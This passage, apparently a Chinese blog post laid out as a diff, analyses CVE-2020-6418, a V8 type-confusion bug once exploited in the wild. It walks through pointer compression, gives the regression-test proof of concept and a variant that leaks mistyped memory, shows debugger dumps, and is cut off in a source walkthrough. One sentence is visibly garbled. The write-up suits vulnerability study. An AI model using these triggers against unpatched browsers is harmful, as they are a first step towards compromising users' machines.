@@ -1,0 +1,225 @@
+**作者：raycp**  
+**原文链接：**
+****
+## 基础知识 – Pointer compression
+`Pointer compression`是`v8 8.0`中为提高64位机器内存利用率而引入的机制。
+篇幅的原因，这里只简要说下和漏洞利用相关的部分，其余的可以看参考链接。
+示例代码：
+    let aa = [1, 2, 3, 4];
+    %DebugPrint(aa);
+    %SystemBreak();
+首先是指针长度的变化，之前指针都是`64`位的，现在是`32`位。而对象地址中高位的`32`字节是基本不会改变的，每次花4个字节来存储高32位地址是浪费空间。因此`8.0`的v8，申请出`4GB`的空间作为堆空间分配对象，将它的高`32`位保存在它的根寄存器中（`x64`为`r13`）。在访问某个对象时，只需要提供它的低`32`位地址，再加上根寄存器中的值机可以得到完整的地址，因此所有的对象指针的保存只需要保存`32`位。
+在示例代码中可以看到`aa`的地址为`0x12e0080c651d`，查看对象中的数据，看到`elements`字段的地址为`0x0825048d`，它的根寄存器`r13`为`0x12e000000000`，因此`elements`的完整地址是`0x12e000000000+0x0825048d=0x12e00825048d`。
+    pwndbg> job 0x12e0080c651d
+    0x12e0080c651d: [JSArray]
+     - map: 0x12e0082817f1  [FastProperties]
+     - prototype: 0x12e008248f7d 
+     - elements: 0x12e00825048d  [PACKED_SMI_ELEMENTS (COW)]
+     - length: 4
+     - properties: 0x12e0080406e9  {
+        #length: 0x12e0081c0165  (const accessor descriptor)
+     }
+     - elements: 0x12e00825048d  {
+               0: 1
+               1: 2
+               2: 3
+               3: 4
+     }
+    pwndbg> x/4wx 0x12e0080c651c
+    0x12e0080c651c: 0x082817f1      0x080406e9      0x0825048d      0x00000008 ;; map | properties | elements | length
+    pwndbg> i r r13
+    r13            0x12e000000000   0x12e000000000
+    pwndbg> print 0x12e000000000+0x0825048d
+    $170 = 0x12e00825048d
+其次是`SMI`的表示，之前64位系统中`SMI`的表示是`value job 0x12e00825048d ;; elements
+    0x12e00825048d: [FixedArray] in OldSpace
+     - map: 0x12e0080404d9 
+     - length: 4
+               0: 1
+               1: 2
+               2: 3
+               3: 4
+    pwndbg> x/6wx 0x12e00825048c
+    0x12e00825048c: 0x080404d9      0x00000008      0x00000002      0x00000004
+    0x12e00825049c: 0x00000006      0x00000008      
+`Pointer compression`给`v8`的内存带来的提升接近于40%，还是比较大的。当然也还有很多细节没有说明，本打算写一篇关于`Pointer
+compression`的文章，但是由于这个漏洞的出现，所以就鸽了，以后有机会再写。
+可以想到的是当一个数组从`SMI`数组，转换成`DOUBLE`数组时，它所占用的空间几乎会翻倍；同时数组从`DOUBLE`数组变成`object`数组时，占用空间会缩小一半。
+## 描述
+`cve-2020-6418`是前几天曝出来的v8的一个类型混淆漏洞，谷歌团队在捕获的一个在野利用的漏洞，`80.0.3987.122`版本前的chrome都受影响。
+根据[commit](https://chromium.googlesource.com/v8/v8/+/fb0a60e15695466621cf65932f9152935d859447)先编译v8：
+    git reset --hard bdaa7d66a37adcc1f1d81c9b0f834327a74ffe07
+    gclient sync
+    tools/dev/gm.py x64.release
+    tools/dev/gm.py x64.debug
+## 分析
+### poc分析
+回归测试代码poc如下：
+    // Copyright 2020 the V8 project authors. All rights reserved.
+    // Use of this source code is governed by a BSD-style license that can be
+    // found in the LICENSE file.
+    // Flags: --allow-natives-syntax
+    let a = [0, 1, 2, 3, 4];
+    function empty() {}
+    function f(p) {
+      a.pop(Reflect.construct(empty, arguments, p));
+    }
+    let p = new Proxy(Object, {
+        get: () => (a[0] = 1.1, Object.prototype)
+    });
+    function main(p) {
+      f(p);
+    }
+    %PrepareFunctionForOptimization(empty);
+    %PrepareFunctionForOptimization(f);
+    %PrepareFunctionForOptimization(main);
+    main(empty);
+    main(empty);
+    %OptimizeFunctionOnNextCall(main);
+    main(p);
+用`release`版本的v8运行不会报错，使用debug版本的v8运行会报错。
+根据`commit`中的信息，应该是`a.pop`调用的时候，没有考虑到`JSCreate`结点存在的`side-effect`（会触发回调函数），改变`a`的类型（变成`DOUBLE`），仍然按之前的类型（`SMI`）处理。
+    [turbofan] Fix bug in receiver maps inference
+    JSCreate can have side effects (by looking up the prototype on an
+    object), so once we walk past that the analysis result must be marked
+    as "unreliable".
+为了验证，可以将`pop`的返回值打印出来，加入代码：
+    let a = [0, 1, 2, 3, 4];
+    function empty() {}
+    function f(p) {
+      return a.pop(Reflect.construct(empty, arguments, p));  // return here
+    }
+    let p = new Proxy(Object, {
+        get: () => (a[0] = 1.1, Object.prototype)
+    });
+    function main(p) {
+      return f(p);   // return here
+    }
+    %PrepareFunctionForOptimization(empty);
+    %PrepareFunctionForOptimization(f);
+    %PrepareFunctionForOptimization(main);
+    print main(empty);
+    print main(empty);
+    %OptimizeFunctionOnNextCall(main);
+    print(main(p));
+运行打印出来的结果，看到最后一次本来应该输出`2`的，却输出为`0`。
+    $ ../v8/out/x64.release/d8  --allow-natives-syntax   ./poc.js
+    4
+    3
+    0
+猜想应该是在`Proxy`中a的类型从`PACKED_SMI_ELEMENTS`数组改成了`PACKED_DOUBLE_ELEMENTS`数组，最后`pop`返回的时候仍然是按`SMI`进行返回，返回的是相应字段的数据。
+在`Proxy`函数中加入语句进行调试：
+    let p = new Proxy(Object, {
+        get: () => {
+            %DebugPrint(a);
+            %SystemBreak();
+            a[0] = 1.1;
+            %DebugPrint(a);
+            %SystemBreak();
+            return Object.prototype;
+        }
+    });
+第一次断点相关数据如下，在`elements`中可以看到偏移`+8`为起始的数据的位置，`a[2]`对应为`2`。
+    pwndbg> job 0x265a080860cd
+    0x265a080860cd: [JSArray]
+     - map: 0x265a082417f1  [FastProperties]
+     - prototype: 0x265a08208f7d 
+     - elements: 0x265a0808625d  [PACKED_SMI_ELEMENTS]
+     - length: 3
+     - properties: 0x265a080406e9  {
+        #length: 0x265a08180165  (const accessor descriptor)
+     }
+     - elements: 0x265a0808625d  {
+               0: 0
+               1: 1
+               2: 2
+             3-4: 0x265a08040385 
+     }
+    pwndbg> x/10wx 0x265a080860cc ;; a
+    0x265a080860cc: 0x082417f1      0x080406e9      0x0808625d      0x00000006 ;; map | properties | elements | length
+    0x265a080860dc: 0x08244e79      0x080406e9      0x080406e9      0x08086109
+    0x265a080860ec: 0x080401c5      0x00010001
+    pwndbg> job 0x265a0808625d
+    0x265a0808625d: [FixedArray]
+     - map: 0x265a080404b1 
+     - length: 5
+               0: 0
+               1: 1
+               2: 2
+             3-4: 0x265a08040385 
+    pwndbg> x/10wx 0x265a0808625c  ;; a's elements
+    0x265a0808625c: 0x080404b1      0x0000000a      0x00000000      0x00000002 ;; map | length | a[0] | a[1]
+    0x265a0808626c: 0x00000004      0x08040385      0x08040385      0x08241f99 ;; a[2] | a[3] | a[4]
+    0x265a0808627c: 0x00000006      0x082104f1
+第二次断点，`a`的类型改变后相关数据如下：
+    pwndbg> job 0x265a080860cd ;; a
+    0x265a080860cd: [JSArray]
+     - map: 0x265a08241891  [FastProperties]
+     - prototype: 0x265a08208f7d 
+     - elements: 0x265a08086319  [PACKED_DOUBLE_ELEMENTS]
+     - length: 3
+     - properties: 0x265a080406e9  {
+        #length: 0x265a08180165  (const accessor descriptor)
+     }
+     - elements: 0x265a08086319  {
+               0: 1.1
+               1: 1
+               2: 2
+             3-4: 
+     }
+    pwndbg> x/10wx 0x265a080860cc ;; a
+    0x265a080860cc: 0x08241891      0x080406e9      0x08086319      0x00000006
+    0x265a080860dc: 0x08244e79      0x080406e9      0x080406e9      0x08086109
+    0x265a080860ec: 0x080401c5      0x00010001
+    pwndbg> job 0x265a08086319  ;; a's elements
+    0x265a08086319: [FixedDoubleArray]
+     - map: 0x265a08040a3d 
+     - length: 5
+               0: 1.1
+               1: 1
+               2: 2
+             3-4: 
+    pwndbg> x/12wx 0x265a08086318  ;; a's elements
+    0x265a08086318: 0x08040a3d      0x0000000a      0x9999999a      0x3ff19999 ;; map | properties | elements | length
+    0x265a08086328: 0x00000000      0x3ff00000      0x00000000      0x40000000
+    0x265a08086338: 0xfff7ffff      0xfff7ffff      0xfff7ffff      0xfff7ffff
+    pwndbg> x/10gx 0x265a08086318 ;; a's elements
+    0x265a08086318: 0x0000000a08040a3d      0x3ff199999999999a
+    0x265a08086328: 0x3ff0000000000000      0x4000000000000000
+    0x265a08086338: 0xfff7fffffff7ffff      0xfff7fffffff7ffff
+在`pointer
+compresssion`中我们知道`SMI`是用32位表示，`double`仍然是使用`64`位表示的，可以看到其所对应的`SMI`表示`a[2]`所在的位置刚好是`0`，验证了猜想。
+可以看到对应的`a[3]`的数据是`浮点数`表示的数字`1`（`0x3ff0000000000000`）的高位，因此如果我们将`a`的长度加1，使得它最后`pop`出来的是`a[3]`的话，将数组改成`let
+a = [0, 1, 2, 3, 4, 5];`，会打印出来的将是`0x3ff00000>>1==536346624`，运行验证如下：
+    $ ../v8/out/x64.release/d8  --allow-natives-syntax   ./poc.js
+    5
+    4
+    536346624
+到此，从poc层面理解漏洞结束，下面我们再从源码层面来理解漏洞。
+### 源码分析
+#### JSCallReducer中的builtin inlining
+在对漏洞进行分析前，需要先讲述下`JSCallReducer`中的`builtin inlining`的原理。
+之前在`inlining`的分析中说过，`builtin`的`inlining`发生在两个阶段：
+  * 在`inlining and native context specialization`时会调用`JSCallReducer`来对`builtin`进行`inlining`。
+  * 在`typed lowering`阶段调用`JSBuiltinReducer`对`builtin`进行`inlining`。
+上面两种情况下，`Reducer`都会尝试尽可能的将内置函数中最快速的路径内联到函数中来替换相应的`JSCall`结点。
+对于`builtin`该在哪个阶段（第一个阶段还是第二个）发生`inlining`则没有非常严格的规定，但是遵循以下的原则：`inlining`时对它周围结点的类型信息依赖度比较高的`builtin`，需要在后面的`typed
+lowering`阶段能够获取相应结点的类型信息后，再在`JSBuiltinReducer`中进行`inlining`；而具有较高优先级（把它们先进行内联后，后续可以更好的优化）的内置函数则要在`inlining
+and native context
+specialization`阶段的`JSCallReducer`中进行内联，如`Array.prototype.pop`、`Array.prototype.push`、`Array.prototype.map`、
+`Function.prototype.apply`以及`Function.prototype.bind`函数等。
+`JSCallReducer`的`ReduceJSCall`相关代码如下，可以看到它会根据不同的`builtin_id`来调用相关的`Reduce`函数。
+    // compiler/js-call-reducer.cc:3906
+    Reduction JSCallReducer::ReduceJSCall(Node* node,
+                                          const SharedFunctionInfoRef& shared) {
+      DCHECK_EQ(IrOpcode::kJSCall, node->opcode());
+      Node* target = NodeProperties::GetValueInput(node, 0);
+      // Do not reduce calls to functions with break points.
+      if (shared.HasBreakInfo()) return NoChange();
+      // Raise a TypeError if the {target} is a "classConstructor".
+      if (IsClassConstructor(shared.kind())) {
+        NodeProperties::ReplaceValueInputs(node, target);
+        NodeProperties::ChangeOp(
+            node, javascript()->CallRuntime(
+                      Runtime::kThrowConstructorNonCallableError, 1));
+        return Changed(node);
